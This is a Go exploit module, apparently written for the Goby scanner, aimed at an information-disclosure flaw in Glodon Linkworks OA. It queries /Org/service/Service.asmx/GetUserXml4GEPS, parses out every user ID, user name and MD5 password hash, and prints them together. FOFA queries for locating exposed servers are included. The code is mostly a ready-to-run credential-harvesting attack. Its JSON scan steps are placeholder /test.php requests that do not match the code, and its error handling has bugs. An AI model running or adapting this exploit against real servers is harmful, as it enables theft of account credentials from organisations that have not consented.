package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": " glodon-linkworks /Service.asmx Information Disclosure Vulnerability",
    "Description": "<p>Glodon Linkworks Office Automation (OA) is a comprehensive office automation solution designed to improve productivity and collaboration within organizations. It offers a range of features and tools to help businesses manage and handle day-to-day office tasks, processes, and documents. 、</p><p>An information disclosure vulnerability was exposed in the Glodon OA/Service.asmx interface, through which an attacker could obtain sensitive server data. Including account password (MD5) information leakage, project information leakage, etc.</p>",
    "Product": "Guanglian-Construction-Ent-PMS",
    "Homepage": "https://www.glodon.com/product/282.html",
    "DisclosureDate": "2023-09-18",
    "PostTime": "2024-08-19",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"Services/Identification/login.ashx\" || body=\"\\\"GTPTDT.ASPX\\\"\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "GobyQuery": "body=\"Services/Identification/login.ashx\" || body=\"\\\"GTPTDT.ASPX\\\"\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "Level": "1",
    "Impact": "<p>An information disclosure vulnerability was exposed in the Glodon OA/Service.asmx interface, through which an attacker could obtain sensitive server data. Including account password (MD5) information leakage, project information leakage, etc.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "GetUserXml4GEPS,moreMesssage",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "广联达OA /Service.asmx 信息泄露漏洞",
            "Product": "广联达OA",
            "Description": "<p>广联达 Linkworks 办公OA（Office Automation）是一款综合办公自动化解决方案，旨在提高组织内部的工作效率和协作能力。它提供了一系列功能和工具，帮助企业管理和处理日常办公任务、流程和文档。</p><p>广联达OA /Service.asmx接口曝出信息泄露漏洞，攻击者可通过该漏洞获取服务器敏感数据信息。包括账户密码(MD5)信息泄露、项目信息泄露等。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>广联达OA /Service.asmx接口曝出信息泄露漏洞，攻击者可通过该漏洞获取服务器敏感数据信息。包括账户密码(MD5)信息泄露、项目信息泄露等。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": " glodon-linkworks /Service.asmx Information Disclosure Vulnerability",
            "Product": "Guanglian-Construction-Ent-PMS",
            "Description": "<p>Glodon Linkworks Office Automation (OA) is a comprehensive office automation solution designed to improve productivity and collaboration within organizations. It offers a range of features and tools to help businesses manage and handle day-to-day office tasks, processes, and documents. 、</p><p>An information disclosure vulnerability was exposed in the Glodon OA/Service.asmx interface, through which an attacker could obtain sensitive server data. Including account password (MD5) information leakage, project information leakage, etc.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>An information disclosure vulnerability was exposed in the Glodon OA/Service.asmx interface, through which an attacker could obtain sensitive server data. Including account password (MD5) information leakage, project information leakage, etc.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9943"
}`

	postOrGet_sadasyhduabuyduwhabdjdbuwatvdtyvags := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/Org/service/Service.asmx/" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/Org/service/Service.asmx"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"GetUserXml4GEPS": "USR_PWDMD5",
			}
			// 函数继承
			uploadFileFunc := postOrGet_sadasyhduabuyduwhabdjdbuwatvdtyvags

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			if mode == "moreMesssage" {
				expResult.Success = true
				expResult.Output = "Please visit the following link to learn more about exposed interfaces:\n" + expResult.HostInfo.FixedHostInfo + "/Org/service/Service.asmx"
				return expResult
			}

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"GetUserXml4GEPS": {"GetUserXml4GEPS", "USR_PWDMD5"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_sadasyhduabuyduwhabdjdbuwatvdtyvags
			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if _, ok := defaultModeMap[mode]; ok {
				fileUrl = defaultModeMap[mode][0]
				fileText = defaultModeMap[mode][1]
			} else {
				expResult.Success = false
				return expResult
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			num := 0

			re, err := regexp.Compile(`&lt;USR_ID&gt;((.|\n)*?)&lt;/USR_ID&gt;`)
			// //检查是否有匹配到内容
			if !re.MatchString(resp) {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			matches := re.FindAllStringSubmatch(resp, -1)
			var userCodes []string
			for _, match := range matches {
				if len(match) > 1 {
					userCodes = append(userCodes, match[1])
					num++
				}
			}

			re, err = regexp.Compile(`&lt;USR_NAME&gt;((.|\n)*?)&lt;/USR_NAME&gt;`)
			if !re.MatchString(resp) {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			matches = re.FindAllStringSubmatch(resp, -1)
			var userNames []string
			for _, match := range matches {
				if len(match) > 1 {
					userNames = append(userNames, match[1])
				}
			}

			re, err = regexp.Compile(`&lt;USR_PWDMD5&gt;((.|\n)*?)&lt;/USR_PWDMD5&gt;`)
			// //检查是否有匹配到内容
			if !re.MatchString(resp) {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			matches = re.FindAllStringSubmatch(resp, -1)
			var userPwdmd5s []string
			for _, match := range matches {
				if len(match) > 1 {
					userPwdmd5s = append(userPwdmd5s, match[1])
				}
			}

			//拼接对应的用户名和密码
			var respStr string
			for i := 0; i < num; i++ {
				respStr += "USR_ID: " + userCodes[i] + "\r\nUSR_NAME:" + userNames[i] + "\r\nUSR_PWDMD5:" + userPwdmd5s[i] + "\r\n\r\n"
			}

			expResult.Output = respStr
			return expResult
		},
	))
}
